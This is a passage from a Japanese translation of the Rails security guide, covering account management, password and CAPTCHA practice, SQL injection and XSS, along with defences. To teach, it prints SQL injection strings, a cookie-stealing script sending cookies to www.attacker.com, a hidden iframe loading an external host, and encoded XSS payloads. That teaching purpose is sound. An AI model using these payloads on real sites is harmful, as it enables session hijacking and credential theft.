_極めて重要な操作では特殊なパスワードを要求する_ ようにするという方法もあります。
* 管理者は、必ずしもそのWebアプリケーション全体にアクセスできる必要はないはずです。
 _送信元IPアドレスを一定の範囲に制限する_ という方法を考えてみましょう。
request.remote_ipメソッドを使用してユーザーのIPアドレスをチェックできます。
この方法は攻撃に対する直接の防弾にはなりませんが、検問として非常に有効です。
プロキシを使用して送信元IPアドレスを偽る方法があることも念頭においてください。
* _管理画面を特別なサブドメインに置き_ (admin.application.comなど)、さらに独立した管理アプリケーションにしてユーザー管理を独自に行えるようにします。
このような構成にすることで、通常のwww.application.com ドメインからの管理者cookieを盗み出すことが不可能になります。
ブラウザには同一生成元ポリシーがあるので、www.application.com に注入されたXSSスクリプトからは admin.application.com のcookieは読み出せず、逆についても同様に読み出し不可となります。
ユーザー管理
---------------
NOTE: _認証 (authentication) と認可 (authorization) はほぼすべてのWebアプリケーションにおいて不可欠です。
認証システムは自前で作るよりも、既存のプラグイン (訳注: 現在ならgem) を使用することをお勧めします。
ただし、常に最新の状態にアップデートするようにしてください。
この他にいくつかの注意を守ることで、アプリケーションをよりセキュアにすることができます。
Railsでは多数の認証用プラグインを利用できます。
人気の高い[devise](https://github.com/plataformatec/devise) や[authlogic](https://github.com/binarylogic/authlogic)などの優れたプラグインは、パスワードを平文ではなく常に暗号化した状態で保存します。
Rails 3.1では、同様の機能を持つビルトインの`has_secure_password`メソッドを使用できます。
新規ユーザーは必ずメール経由でアクティベーションコードを受け取り、メール内のリンク先でアカウントを有効にするようになっています。
アカウントが有効になると、データベース上のアクティベーションコードのカラムはNULLに設定されます。
以下のようなURLをリクエストするユーザーは、データベースで見つかる最初に有効になったユーザーとしてWebサイトにログインできてしまうことがあります。そしてそれがたまたま管理者である可能性もあります。
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
一部のサーバーでは、params[:id]で参照されるパラメータidがnilになってしまっていることがあるので、上のURLが通用してしまう可能性があります。
アクティベーション操作中にこのことが突き止められるまでの流れは以下のとおりです。
User.find_by_activation_code(params[:id])
パラメータがnilの場合、以下のSQLが生成されます。
```sql
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
この結果、最初のユーザーがデータベースにいることがわかり、結果が返されてログインされます。
_プラグインは、機会を見てアップデートすることをお勧めします_ 。
さらに、Webアプリケーションにこのような欠陥がないかどうか見直しをかけてください。
### アカウントに対する総当たり攻撃
NOTE: _アカウントに対する総当たり攻撃 (Brute-force attack) とは、ログイン情報に対して試行錯誤を繰り返す攻撃です。
エラーメッセージをより一般的なものにすることで回避可能ですが、CAPTCHA (相手がコンピュータでないことを確認するためのテスト) への情報入力の義務付けもおそらく必要でしょう_ 。
Webアプリケーション用のユーザー名リスト (名簿) は、パスワードへの総当たり攻撃に悪用される可能性があります。ユーザー名と同じであるなどの単純素朴なパスワードを使っている人が驚くほど多いため、総当たり攻撃に名簿が利用されやすいのです。
辞書に載っている言葉に数字を混ぜた程度のパスワードが使用されていることがよくあります。
従って、名簿と辞書を使用して総当り攻撃を行なう自動化プログラムがあれば、ものの数分でパスワードは見破られてしまいます。
このような総当たり攻撃を少しでもかわすため、多くのWebアプリケーションはわざと一般的なエラーメッセージ「ユーザー名またはパスワードが違います」を表示するようにしています。どちらが違っているのかという情報を表示しないことで、総当たり攻撃による推測を少しでも遅らせます。
「入力されたユーザー名は登録されていません」などというメッセージが返されようものなら、攻撃者はすぐさまユーザー名リストをかき集めて自動で巨大名簿を作成するでしょう。
しかし、Webアプリケーションのデザイナーがおろそかにしがちなのは、いわゆる「パスワードを忘れた場合」ページです。
こうしたページではよく、「入力されたユーザー名またはメールアドレスは登録されていません」という情報が表示されます。
こうした情報は、攻撃者がアカウントへの総当り攻撃に使う有効なユーザー名一覧を作成するのに使われてしまいます。
これを少しでも緩和するには、 _「パスワードを忘れた場合」ページでも一般的なエラーメッセージを表示する_ ようにしましょう。
さらに _特定のIPアドレスからのログインが一定回数以上失敗した場合には、CAPTCHA の入力をユーザーに義務付ける_ ようにしてください。
もちろん、このぐらいでは自動化された総当たり攻撃プログラムからの攻撃から完全に免れることはできません。こうしたプログラムは送信元IPアドレスを頻繁に変更するぐらいのことはやってのけるからです。
しかしこの対策は攻撃に対するある程度のバリアになることも確かです。
### アカウントのハイジャック
多くのWebアプリケーションでは、ユーザーアカウントのハイジャックを容易に行えてしまいます。
攻撃を困難にするような改良が進まないのはなぜでしょうか。
#### パスワード
攻撃者が、盗み出されたユーザーセッションcookieを手に入れ、それによってWebアプリケーションが標的ユーザーとの間で共用可能になった状態を考えてみましょう。
パスワードが簡単に変更できる画面設計(古いパスワードの入力が不要)であれば、攻撃者は数クリックするだけでアカウントをハイジャックできてしまいます。
あるいは、パスワード変更画面がCSRF攻撃に対して脆弱な作りになっている場合、攻撃者は標的ユーザーを別のWebページに誘い込み、CSRFを実行するように仕込まれたimgタグを踏ませて、標的ユーザーのWebパスワードを変更するでしょう。
対応策としては、_パスワード変更フォームがCSRF攻撃に対して脆弱にならないようにすること_ です。
同時に、 _ユーザーにパスワードを変更させる場合は、古いパスワードを必ず入力させるようにしてください。_
#### メール
しかし攻撃者は、登録されているメールアドレスを変更することでアカウントを乗っ取ろうとする可能性もありますので注意が必要です。
攻撃者はメールアドレス変更に成功すると、「パスワードを忘れた場合」ページに移動し、攻撃者の新しいメールアドレスに変更通知メールを送信します。システムによってはこのメールに新しいパスワードが記載されていることもあります。
対応策は、 _メールアドレスを変更する場合にもパスワード入力を必須にする_ ことです。
#### その他
Webアプリケーションの構成によっては、ユーザーアカウントをハイジャックする方法が他にも潜んでいる可能性があります。
多くの場合、CSRFとXSSが原因となります。
ここでは[GMailのCSRF脆弱性](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/) で紹介されている例をとりあげます。
なお上の記事に記載されているのは概念実証に過ぎません。仮にこの攻撃を受けた場合、標的ユーザーは攻撃者が支配するWebサイトに誘い込まれます。
そのサイトのImgタグには仕掛けがあり、GMailのフィルタ設定を変更するHTTP GETリクエストがそこから送信されます。
この標的ユーザーがGMailにログインしていた場合、フィルタ設定が攻撃者によって変更され、この場合はすべてのメールが攻撃者に転送されるようになります。
この状態は、アカウント全体がハイジャックされたのと同じぐらいに有害です。
対応策は、 _アプリケーションのロジックを見なおしてXSSやCSRF脆弱性が持ち込まれないようにすること_ としか言いようがありません。
### CAPTCHA
INFO: _CAPTCHAとは、コンピュータによる自動応答でないことを確認するためのチャレンジ-レスポンス式テストです。
コメント入力欄などで、歪んだ画像に表示されている文字を入力させることで、入力社が自動スパムボットでないことを確認する場合によく使用されます。
ネガティブCAPTCHAという手法を使えば、入力者に自分が人間であることを証明させるかわりに、ボットを罠にはめて正体を暴くことができます。
いわゆるスパムボット以外に、自動ログインボットも問題となります。
CAPTCHAのAPIとしては[reCAPTCHA](http://recaptcha.net/)が有名です。これは古書から引用した言葉を歪んだ画像として表示します。
初期のCAPTCHAでは背景を歪めて反りを与えていましたが、これは突破されたため、現在では文字の上に曲線を書き加えて強化しています。
なお、reCAPTCHAは古書のデジタル化にも使えます。
[ReCAPTCHA](https://github.com/ambethia/recaptcha/)はRailsのプラグインにもなっており、APIとして同じ名前が使用されています。
このAPIからは公開鍵と秘密鍵の2つの鍵を受け取ります。これらはRailsの環境に置く必要があります。
それにより、ビューでrecaptcha_tagsメソッドを、コントローラではverify_recaptchaメソッドをそれぞれ使用できます。
検証に失敗するとVerify_recaptchaからfalseが返されます。
いわゆるCAPTCHAの問題は、ユーザーにとって入力が多少なりとも面倒になることです。
さらに、弱視など視力に問題のあるユーザーはCAPTCHAの歪んだ画像をうまく読めないこともあります。
ここで、ネガティブCAPTCHAという別のアイディアがあります。この方法のコンセプトは、入力者をわずらわせて自分が人間であることを証明させる代りに、ボットを罠にはめて入力者がボットであることを突き止めるというものです。
たいていのボットは、単にWebページをクロールしてフォームを見つけるたびにスパム文を入力するだけのお粗末なものです。
ネガティブCAPTCHAでは、ボットをはめる罠として「ハニーポット」フィールドを用意します。これは、CSSやJavaScriptを使用して人間には表示されないようにしたダミーのフィールドです。
ここでは、JavaScriptやCSSを使用してハニーポットフィールドを人間から隠す方法をいくつか説明します。
* ハニーポットフィールドを画面の外に追いやって見えないようにする
* フィールドを見ないぐらいに小さくしたり、背景と同じ色にしたりする
* ハニーポットフィールドを隠さず、その代わり「このフィールドには何も入力しないでください」と表示する
最もシンプルなネガティブCAPTCHAは、ハニーポットフィールドを1つ使用するものです。
このフィールドをサーバー側でチェックします。フィールドに何か書き込まれていれば、入力者はボットであると判定できます。
後はフォームの内容を無視するなり、通常通りメッセージを表示する(データベースには保存しない)などすればよいのです。
通常どおりメッセージを表示しておけば、ボットは書き込み失敗に気が付かずにそのまま通りすぎていくでしょう。
この手法は、迷惑なユーザーへの対応策としても有効です。
Ned Batchelderの[ブログ投稿](http://nedbatchelder.com/text/stopbots.html)には、さらに洗練されたネガティブCAPTCHA手法がいくつか紹介されています。
* 現在のUTCタイムスタンプを含めたフィールドをフォームに含めておき、サーバー側でこのフィールドをチェックします。
フィールドの時刻が遠い過去になっていたり未来になっていたりする場合は、そのフォームは無効です。
* フィールド名をランダムに変更します
* ハニーポットフィールドを複数用意し、送信ボタンを含むあらゆる型を与えます。
ネガティブCAPTCHAは、Webをクロールする自動ボットから保護することしかできません。特定のサイトに狙いを定めて作られたボットまでは欺けません。
従って、 _ネガティブCAPTCHAはログインフォームの保護には必ずしも向かない可能性もあります_ 。
### ログ出力
WARNING: _Railsのログ出力にパスワードが含まれることのないようにしてください。
デフォルトでは、RailsのログにはWebアプリケーションへのリクエストがすべて出力されます。
しかしログファイルにはログイン情報、クレジットカード番号などの情報が含まれていることがあるため、重大なセキュリティ問題の原因になることがあります。
Webアプリケーションのセキュリティコンセプトをデザインするにあたり、攻撃者がWebサーバーへのフルアクセスを成功させてしまった場合のことも必ず考慮に含めておく必要があります。
パスワードや機密情報がログファイルに平文のままで出力されていては、データベース上でこれらの情報を暗号化していても意味がなくなってしまいます。
Railsアプリケーションの設定ファイル config.filter_parameters に _特定のリクエストパラメータをログ出力時にフィルタする_ 設定を追加することができます。
フィルタされたパラメータはログ内で [FILTERED] という文字に置き換えられます。
config.filter_parameters << :password
### よいパスワード
INFO: _思い出せなくなったパスワードがありますか。
パスワードを書き留めたりしないでください。覚えられる文を決め、単語の頭文字を集めたものをパスワードにしてください。
その結果、大半のパスワードがいとも簡単にクラックできてしまうことが判明しました。
最もありがちな20のパスワードは以下のとおりです。
password1、abc123、myspace1、password、blink182、qwerty1、****you、123abc、baseball1、football1、123456、soccer、monkey1、liverpool1、princess1、jordan23、slipknot1、superman1、iloveyou1、monkey
なお、辞書に載っている単語がそのまま使われているケースはこの中で4%に過ぎず、ほとんどは英文字に数字を混ぜたものになっているのはなかなか興味深い点です。
しかし、パスワードクラック用の辞書にはこうした膨大なパスワードが集められており、攻撃者は英文字と数字のあらゆる組み合わせを試そうとしています。
攻撃者が標的ユーザーのユーザー名を知り、そのユーザーが使用しているパスワードが弱ければ、そのアカウントは簡単にクラックされてしまいます。
よいパスワードの条件とは、「十分に長く」「英文字と数字が使用されており」「大文字と小文字が両方使用されている」ことです。
しかしそのようなパスワードは覚えにくいので、まずは _覚えられる文を決め、その文で使用されている単語の頭文字を集めてパスワードにする_ ことをお勧めします。
The quick brown fox jumps over the lazy dog」という文ならたとえば「Tqbfjotld」というパスワードにできます。
もちろん上はあくまで例に過ぎません。実際にはこのようなありふれた文をパスワードにしないでください。この程度のパスワードはクラッキング用辞書に収録されている可能性があります。
### 正規表現
INFO: _Rubyの正規表現で落とし穴になりやすいのは、より安全な「\A」や「\z」があることを知らずに危険な「\^」や「$」を使ってしまうことです。
Rubyの正規表現では、文字列の最初や最後にマッチさせる方法が他の言語と若干異なります。
このため、多くのRuby本やRails本でもこの点に誤りが生じています。
いったいどのような問題が生じるのでしょうか。
たとえば、URL形式になっているかどうかをざっくりと検証したいので、以下のような単純な正規表現を使用したとします。
  /^https?:\/\/[^\n]+$/i
これは一部の言語では正常に動作します。
しかし、 _Rubyでは「\^」と「$」は、入力全体ではなく、 **行の** 最初と最後_ にマッチしてしまいます。
従って、この場合以下のような毒入りURLはフィルタを通過してしまいます。
javascript:exploit_code();/*
http://hi.com
上のURLがフィルタに引っかからないのは、入力の2行目にマッチしてしまうからです。従って、1行目と3行目にどんな文字列があってもフィルタを通過してしまいます。
フィルタをすり抜けてしまったURLが、今度はビューの以下の箇所で表示されたとします。
  link_to "Homepage", @user.homepage
表示されるリンクは一見無害に見えますが、クリックすると、攻撃者が送り込んだ邪悪なJavaScript関数を初めとするJavaScriptコードが実行されてしまいます。
これらの正規表現は、危険な「\^」や「$」を安全な「\A」や「\z」に置き換える必要があります。
  /\Ahttps?:\/\/[^\n]+\z/i
「\^」や「$」を使用してしまうミスは何かと発生しやすいので、正規表現が「\^」で始まったり「$」で終わっていたりするとフォーマットバリデータ (validates_format_of) で例外が発生するようになりました。
めったにないと思われますが、「\A」や「\z」の代りに「\^」や「$」をどうしても使用したい場合は、:multilineオプションをtrueに設定することもできます。
  # この文字列のどの行であっても"Meanwhile"という文字が含まれている必要があります。
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
この方法は、フォーマットバリデータ使用時に起きがちな間違いから保護するためだけのものです。「\^」と「$」はRubyでは **1つの行** に対してマッチし、文字列全体にマッチしないということをよく理解することが重要です。
### 権限昇格
WARNING: _1つのパラメータが変更されただけでも、ユーザーが不正な権限でアクセスできるようになってしまうことがあります。
パラメータは、たとえどれほど難読化し、隠そうとも変更される可能性があることを忘れないでください。
改ざんされる可能性が高いパラメータといえばidでしょう。`http://www.domain.com/project/1`の1がidです。
このidはコントローラのparamsを経由して取得できます。
コントローラ内では、次のようなことが行われている可能性があります。
@project = Project.find(params[:id])
Webアプリケーションによってはこのコードでも問題はありませんが、そのユーザーがすべてのビューを参照する権限がない場合には問題となります。
このユーザーがURLのidを42に変更し、本来のidでは表示できないページを表示できてしまいます。
このようなことにならないよう、 _ユーザーのアクセス権もクエリに含めてください_ 。
@project = @current_user.projects.find(params[:id])
Webアプリケーションによっては、ユーザーが改ざん可能なパラメータが他にも潜んでいる可能性があります。
経験則に照らし合わせても、 _安全が確認されていないユーザー入力が安全であることはありえず、ユーザーから送信されるどのようなパラメータにも、何らかの操作が加えられている可能性は常にあります_ 。
難読化とJavaScriptによる検証のセキュリティだけで安全を保てると考えてはなりません。
Mozilla FirefoxのWeb Developer Toolbarを使用すれば、フォームの隠しフィールドを見つけて変更することができます。
_JavaScriptを使用してユーザーの入力データを検証することはできますが、攻撃者が想定外の値を与えて邪悪なリクエストを送信することは阻止できません_ 。
Mozilla Firefox用のLive HTTP Headersプラグインを使用すると、すべてのリクエストをログに記録して、それらを繰り返し送信したり変更したりすることができます。
さらに、JavaScriptによる検証はJavaScriptをオフにすれ簡単にバイパスできてしまいます。
クライアント側に、クライアントからのリクエストやインターネットからの応答を傍受しているプロキシが介在している可能性も忘れないようにしておく必要があります。
インジェクション
---------
INFO: _インジェクション (注入) とは、Webアプリケーションに邪悪なコードやパラメータを導入して、そのときのセキュリティ権限で実行させることです。
XSS (クロスサイトスクリプティング) やSQLインジェクションはインジェクションの顕著な例です。
インジェクションは、それによって注入されるコードやパラメータが、あるコンテキストでは有害であっても、それ以外のほとんどのコンテキストでは無害であるという点で非常にトリッキーであると言えます。
ここでいうコンテキストとは、スクリプティング、クエリ、プログラミング言語、シェル、RubyやRailsのメソッドなどがあります。
以下の節では、インジェクション攻撃が発生しうる重要なコンテキストについて説明します。
ただし最初の節では、インジェクションの際の接続方法におけるアーキテクチャ上の決定事項について説明します。
### ホワイトリストとブラックリスト
NOTE: _サニタイズ、保護、検証では、通常ホワイトリストの方がブラックリストよりも使用されます。
悪事に使われるメールアドレス、非公式のアクション、邪悪なHTMLタグなどについてブラックリストが作成されることがあります。
ホワイトリストはこれと対を成すもので、悪事に使われないことがわかっているメールアドレス、公式のアクション、無害なメールアドレスなどをホワイトリストにすることができます。
スパムフィルタなど、対象によってはホワイトリストを作成しようがないものもありますが、 _基本的にはまずホワイトリストが使用されます_ 。
* before_actionでは、except: [...]ではなくonly: [...]を使用してください。
その方が将来コントローラにアクションが追加された場合に、そのアクションをオフにするのを忘れずに済みます。
* クロスサイトスクリプティング (XSS) 対策として、&lt;script&gt;を削除するのではなく&lt;strong&gt;を許可してください。
詳細については、下記を参照してください。
* ブラックリストに引っかかったユーザー入力データをコードで修正して使用しないでください。
    * そのようなことをすると、"&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")という攻撃が成立してしまいます。
    * ブラックリストに引っかかった入力は受け付けないでください。
特定の項目だけを許可するホワイトリストアプローチは、特定の項目だけを禁止するブラックリストアプローチに比べて、ブラックリストへの禁止項目の追加忘れが原理的に発生しないので、望ましい方法であると言えます。
### SQLインジェクション
INFO: _メソッドの改良が進んだおかげで、SQLインジェクションがRailsアプリケーションで問題になることはめったになくなりました。
しかしSQLインジェクションはひとたび発生すれば壊滅的な打撃を受ける可能性があり、Webアプリケーションに対する一般的な攻撃方法でもあるため、この問題を十分に理解することが重要です。
#### はじめに
SQLインジェクションは、Webアプリケーションのパラメータを操作してデータベースクエリに影響を与えることを目的とした攻撃手法です。
SQLインジェクションは、認証をバイパスする目的でよく使用されます。
他にも、データを操作したり任意のデータを読み出したりする目的にも使用されます。
クエリのユーザー入力データをそのまま使用せずに改ざんする方法の例を以下で説明します。
Project.where("name = '#{params[:name]}'")
上のコードは検索用のアクションなどで使われるものであり、ユーザーは検索したいプロジェクト名を入力します。
ここで、悪意のあるユーザーが「' OR 1 --」という文字列を入力すると、以下のSQLクエリが生成されます。
SELECT * FROM projects WHERE name = '' OR 1 --'
2つのダッシュ「--」が末尾に置かれると、以後に追加されるクエリがすべてコメントと見なされてしまい、実行されなくなります。
そのため、projectsテーブルからすべてのレコードが取り出されます。これらは通常のユーザーからは参照できないはずのものです。
これは、クエリですべての条件がtrueになっているために発生しています。
#### 認証のバイパス
Webアプリケーションには、何らかの形でアクセス制御が行われるのが普通です。
ユーザーがログイン情報を入力すると、Webアプリケーションはユーザーテーブルに登録されているレコードとマッチするかどうかを調べます。
既存のレコードとマッチする場合、アプリケーションはアクセスを許可します。
しかしながら、攻撃者がSQLインジェクションを使用することでこの認証をすり抜けてしまう可能性があります。
以下はRailsにおける典型的なデータベースクエリです。ユーザーが入力したログイン情報パラメータとマッチするUserテーブル上の最初のレコードを返します。
User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
ここで攻撃者が「' OR '1'='1」という文字列を名前フィールドに入力し、「' OR '2'>'1」をパスワードフィールドに入力すると以下のSQLクエリが生成されます。
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
マッチする最初のレコードがこのクエリによって取得され、ユーザーにアクセスが許可されてしまいます。
#### 不正なデータ読み出し
UNION文は2つのSQLクエリをつなぎ、1つのセットとしてデータを返します。
攻撃者はUNIONを使用してデータベースから任意のデータを読み出す可能性があります。
再び上の例を使用して説明します。
ここで、UNION文を使用した以下の文字列を注入したとします。
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
これによって以下のSQLが生成されます。
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
このクエリで得られるのはプロジェクトのリストではなく(名前が空欄のプロジェクトはないので)、ユーザー名とパスワードのリストです。
データベース上のパスワードが暗号化されていればまだ最悪の事態は避けられます。
一方、攻撃者にとって気がかりなのは、両方のクエリでカラムの数を同じにしなければならないということです。
この攻撃用文字列では、そのために2番目のクエリに「1」を連続して配置しています。これらの値は常に1になるので、1番目のクエリのカラム数と一致します。
同様に、2番目のクエリではASを使用してカラム名をリネームしています。これにより、ユーザーテーブルから取り出した値がWebアプリケーション上で表示されます。
Railsを[最低でも2.1.1にアップデート](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/)してください。
#### 対応策
Ruby on Railsには、特殊なSQL文字をフィルタする仕組みがビルトインで備わっています。「'」「"」NULL、改行がエスケープされます。
条件オプションには文字列を直接渡す代りに、以下のように配列を渡すことで、汚染された文字列をサニタイズすることもできます。
Model.where("login = ? 
AND password = ?", entered_user_name, entered_password).first
上に示したように、配列の最初の部分がSQLフラグメントになっており、その中に疑問符「?」が含まれています。
サニタイズされた変数は、配列の後半に置かれており、フラグメント内の疑問符を置き換えます。
ハッシュを渡して同じ結果を得ることもできます。
Model.where(login: entered_user_name, password: entered_password).first
モデルのインスタンスでは、配列またはハッシュのみが使用できます。
他の場所で`sanitize_sql()`を使ってみることもできます。
_SQLで外部の文字列を、サニタイズせずに使用するとセキュリティ上重大な結果がもたらされる可能性があることを普段から考える習慣をつけましょう_ 。
### クロスサイトスクリプティング (XSS)
INFO: _XSSは最もよく発生しするWebセキュリティ上の脆弱性であり、ひとたび発生すると壊滅的な影響が生じる可能性があります。
XSSを使用した悪意のある攻撃が行われると、クライアント側のコンピュータに実行可能なコードが注入されてしまいます。
Railsには、このような攻撃をかわすためのヘルパーメソッドが用意されています。
#### 攻撃点
攻撃点 (entry point) とは、攻撃者が攻撃を向ける対象となる、脆弱なURLおよびパラメータのことです。
攻撃点として最も選ばれやすいのはメッセージ投稿、ユーザーコメント、ゲストブックですが、プロジェクトタイトル、ドキュメント名、検索結果ページなども同様に脆弱性を抱えていたことがありました。ユーザーがデータを入力可能なところはどこでも攻撃点になりえます。
ただし、攻撃者がデータを入力するのはWebサイト上の入力ボックスとは限りません。URLに含まれているパラメータ、URLに直接含まれていないが使用可能な「隠れた」パラメータ、URLに含まれない内部パラメータのどこからでも攻撃者がデータを入力する可能性があります。
攻撃者がすべてのトラフィックを傍受している可能性を常に考慮に入れる必要があります。
Firefoxの[Live HTTP Headersプラグイン](http://livehttpheaders.mozdev.org/)やクライアント側でのプロキシを使用することで、リクエストを簡単に改ざんすることができます。
XSS攻撃は次のように行われます。攻撃者が何らかのコードをWebアプリケーションに注入し、後に標的ユーザーのWebページ上に表示されます。
多くのXSSの例では、単に警告ボックスを表示するだけですが、実際のXSS攻撃はもっと凶悪です。
XSSを使用することで、cookieの盗み出し、セッションのハイジャック、標的ユーザーを偽のWebサイトに誘い込む、攻撃者の利益になるような広告を表示する、Webサイトの要素を書き換えてユーザー情報を盗み出したりWebブラウザのセキュリティ・ホールを経由して邪悪なソフトウェアをインストールしたりできることがあります。
2007年後半、Mozillaブラウザで88の脆弱性、Safariで22、IEで18、Operaで12の脆弱性が報告されました。
[Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) には、2007年後半にブラウザのプラグインで239の脆弱性が報告されています。
[Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/)は大変活発かつ最新の攻撃用フレームワークであり、これらの脆弱性を使用しています。
犯罪的なハッカーにとって、WebアプリケーションフレームワークのSQLインジェクションの脆弱性につけ込み、テキストテーブルのカラムに凶悪なコードを注入して回るのはたまらない魅力です。
2008年4月には、510,000以上のWebサイトがこの方法でハッキングされ、英国政府、国連など多くの重要なサイトが被害に遭いました。
バナー広告は、比較的目新しい攻撃点です。
[Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/)によると、2008年初頭に、MySpaceやExciteなどの有名サイトのバナー広告に悪意のあるコードが仕込まれたという事例がありました。
#### HTML/JavaScriptインジェクション
XSS攻撃に利用されやすい言語は、言うまでもなくクライアント側で最も普及している言語であるJavaScriptであり、しばしばHTMLと組み合わせて攻撃に使用されます。 _攻撃を避けるにはユーザー入力をエスケープする_ 必要があります。
XSSをチェックする最も簡単なテストをご紹介します。
<script>alert('Hello');</script>
このJavaScriptコードを実行すると、警告ボックスが1つ表示されるだけです。
次の例では、見かけの動作はまったく同じですが、通常ではありえない場所にコードが置かれています。
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
##### Cookie窃盗
先ほどの例では何の害も生じないので、今度は攻撃者がユーザーのcookieを盗み出す手法をご紹介します (攻撃者はこれを使用してユーザーのセッションをハイジャックします)。
JavaScriptでは、document.cookieプロパティを使用してドキュメントのcookieを読み書きできます。
JavaScriptでは同一生成元ポリシーが強制的に適用されます。これは、あるドメインから送り込まれたスクリプトからは、別のドメインのcookieにアクセスできないようにするポリシーです。
document.cookieプロパティには、生成元webサーバーのcookieが保存されています。
しかし、HTMLドキュメントに直接コードを埋め込むと(XSSによってこれが生じることがあります)、このプロパティを読み書きできてしまいます。
このコードを自分のWebアプリケーションの適当な場所に手動で注入すると、そのページに含まれている自身のcookieが表示されるのがわかります。
<script>document.write(document.cookie);</script>
もちろん、攻撃者にしてみれば標的ユーザーが自分で自分のcookieを表示したところで何の意味もありません。
次の例では、http://www.attacker.com/ というURLから画像とcookieを読み込みます。
言うまでもありませんが、このURLは実際には存在しませんので、ブラウザには何も表示されません(訳注: 現在は売り物件のWebページがあるようです)。
ただし攻撃者はWebサーバーのアクセスログファイルを調べて標的ユーザーのcookieを参照することができます。
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
www.attacker.com サイト上のログファイルには以下のように記録されます。
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
HTTP only cookieはIE v6から使用できます。
SP1, Firefox v2.0.0.5 and Opera 9.5. Safariはまだこのフラグを検討中であり、このオプションは無視されます。
ただしWebTVやMac版IE 5.5などの古いブラウザでは、ページ上での読み込みに失敗します。
##### Webページの汚損
Webページを書き換える (汚損) ことで、偽の情報を表示したり、標的ユーザーを攻撃者の偽サイトに誘い込んでcookieやログイン情報などの重要データを盗み出すなどのさまざまな攻撃が可能になります。
最も多い攻撃は、iframeを使用して外部のコードをWebページに含める方法です。
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
このコードによって、外部にある任意のHTMLやJavaScriptが読み込まれ、Webサイトの一部として埋め込まれます。
上のiframeは、[Mpack攻撃フレームワーク](http://isc.sans.org/diary.html?storyid=3015)を使用してイタリアにあるWebサイトへの攻撃で実際に用いられたものです。
MpackはWebブラウザのセキュリティホールを介して邪悪なソフトウェアをインストールしようとします。そして攻撃の成功率は50%を誇っています。
さらに専門的な攻撃としては、Webサイト全体を上に重ねて表示したりログインフォームを表示したりするというのがあります。これらは元のサイトと一見そっくりですが、入力されたユーザー名とパスワードを密かに攻撃者のサイトに送信します。
あるいは、CSSやJavaScriptを駆使してWebアプリケーション上の本物のリンクを隠して別のリンクを表示し、ユーザーを偽のサイトにリダイレクトするという手法もあります。
リフレクションインジェクション (Reflected injection) 攻撃も同様の攻撃です。標的ユーザーに後で表示されるペイロードが保存されておらず、実際にはURLに長大な文字列として仕込まれています。
以下のリンク先には、「ジョージ・ブッシュが議長に9歳の男の子を任命」と書かれたページがありました。
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
#### 対応策
_悪意のある入力をフィルタすることがきわめて重要です。Webアプリケーションの出力をエスケープすることも同様に重要です_。
特にXSSの場合、_ブラックリストではなくホワイトリストに基づいた入力フィルタを実施することが絶対重要です_。
ホワイトリストフィルタでは特定の値のみが許可され、それ以外の値はすべて拒否されます。
ブラックリストを元にしている限り、必ず将来漏れが生じます。
ユーザー入力から「script」という文字を除去するのに使用されているブラックリストがあるとしましょう。
それなら攻撃者は次には「&lt;scrscriptipt&gt;」という文字を入力するでしょう。この文字がフィルタされると「&lt;script&gt;」という文字が残ってしまいます。
以前のRailsではstrip_tags()、strip_links()、sanitize()メソッドでブラックリスト的アプローチが使用されていました。
従って、当時は以下のような攻撃が可能になっていました。
strip_tags("some<<b>script>alert('hello')<</b>/script>")
フィルタから返される「"some&lt;script&gt;alert('hello')&lt;/script&gt;」という文字列の攻撃能力は温存されています。
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
この方法なら指定されたタグのみが許可されるため、あらゆる攻撃方法や邪悪なタグに対してフィルタが健全に機能します。
第2段階として、 _Webアプリケーションからの出力をもれなくエスケープする_ ことが優れた対策となります。これは特に、ユーザー入力の段階でフィルタされなかった文字列がWeb画面に再表示されてしまうようなことがあった場合に有効です。
_`escapeHTML()` (または別名の`h()`) メソッド_ を使用して、HTML入力文字「&amp;」「&quot;」「&lt;」「&gt;」を、無害なHTML表現形式(`&amp;`、`&quot;`、`&lt;`、`&gt;`) に置き換えます。
SafeErbは、外部入力された文字列をエスケープするよう通知してくれます。
##### 攻撃の難読化とエンコーディングインジェクション
従来のネットワークトラフィックは西欧文化圏のアルファベットがほとんどでしたが、それ以外の言語を伝えるためにUnicodeなどの新しいエンコード方式が使用されるようになってきました。
しかしこれはWebアプリケーションにとっては新たな脅威となるかもしれません。異なるコードでエンコードされた中に、ブラウザでは処理可能だがサーバーでは処理されないような悪意のあるコードが潜んでいるかもしれないからです。
UTF-8による攻撃方法の例を以下に示します。
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
上の例を実行するとメッセージボックスが表示されます。
なお、これは上のsanitize()フィルタで認識されます。
[Hackvertor](https://hackvertor.co.uk/public)は文字列の難読化とエンコードを行なう優れたツールであり、「敵を知る」のに最適です。
Railsのsanitize()メソッドは、このようなエンコーディング攻撃をかわす働きをします。
#### 実際の攻撃例
_近年におけるWebアプリケーションへの攻撃を理解するために、実際の攻撃例をご紹介します。
